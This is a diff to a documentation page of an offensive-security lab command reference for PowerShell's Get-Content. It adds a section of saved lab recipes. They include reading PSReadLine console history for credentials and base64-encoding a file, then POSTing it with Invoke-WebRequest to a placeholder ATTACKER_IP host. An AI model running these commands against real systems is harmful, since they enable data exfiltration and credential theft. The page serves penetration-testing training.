@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=get-content) · [All tools](/index)
+
 ## Read a file
 
 **Windows PowerShell**
@@ -31,8 +33,61 @@ PSReadLine/history may be absent in noninteractive sessions.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=Get-Content)
+## Notebook recipes
 
-## Learning and original examples
+4 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Find Credentials on Windows](/password-attacks/credential-hunting-in-windows)
+<AccordionGroup>
+
+<Accordion title="2. Harnessing PowerShell">
+
+### 2. Harnessing PowerShell
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+```
+
+</Accordion>
+
+<Accordion title="Base64 Encode &amp; Decode (Upload)">
+
+### Base64 Encode & Decode (Upload)
+
+**File Transfers for Linux and Windows**
+
+```powershell
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
+
+</Accordion>
+
+<Accordion title="PowerShell Web Uploads">
+
+### PowerShell Web Uploads
+
+**File Transfers for Linux and Windows**
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
+```
+
+</Accordion>
+
+<Accordion title="Password in Alternate Data Stream">
+
+### Password in Alternate Data Stream
+
+**Windows Privilege Escalation: Full Checklist**
+
+```ps1
+PS > Get-Item -path flag.txt -Stream *
+PS > Get-Content -path flag.txt -Stream Flag
+```
+
+</Accordion>
+
+</AccordionGroup>
